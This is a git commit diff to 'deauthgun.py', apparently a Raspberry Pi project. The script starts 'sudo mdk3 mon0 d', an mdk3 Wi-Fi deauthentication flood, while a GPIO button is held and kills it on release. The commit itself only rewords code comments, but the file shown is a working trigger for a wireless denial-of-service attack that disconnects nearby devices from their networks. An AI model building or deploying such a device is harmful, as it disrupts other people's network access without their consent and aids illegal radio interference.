2762347f524a92a96b17db42d9c9f62efe2197b4
TheUnkn0wnN00b <andastrike@gmail.com>
2020-07-31 17:03:19 -0500

    Update deauthgun.py
    fix some code comments

--- deauthgun/deauthgun.py
+++ deauthgun/deauthgun.py
@@ -5,7 +5,7 @@ import os
 import signal
 
 
-FSU = 'sudo mdk3 mon0 d'
+FSU = 'sudo mdk3 mon0 d' # the command that we actually want to execute when we flip the switch
 
 # tell the GPIO module that we want to use the chip's numbering scheme
 GPIO.setmode(GPIO.BCM)
@@ -16,11 +16,11 @@ GPIO.setup(16, GPIO.IN, pull_up_down=GPIO.PUD_UP)
 
 running = False
 
-while True: # who needs asyncio anyway
-    if GPIO.input(16) == GPIO.LOW:  # not making an event with the GPIO library because it SUCKS and doesnt work
+while True:
+    if GPIO.input(16) == GPIO.LOW:  # I'm not making an event with the GPIO library because it SUCKS and doesnt work
         if not running:  # failsafe because my code sucks
             print('Button was pushed!')
-            # declare the proc variabe again and also start the process
+            # declare the proc variabe, which starts the process
             proc = subprocess.Popen(FSU, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
             running = True
             time.sleep(0.1)
@@ -28,7 +28,7 @@ while True: # who needs asyncio anyway
             print('The process is running.')
             time.sleep(0.1)
     elif GPIO.input(16) == GPIO.HIGH and running == True:
-        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # kill the deauth process
+        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # kill the previously started process
         print('Process killed.')
         running = False
         time.sleep(0.1)
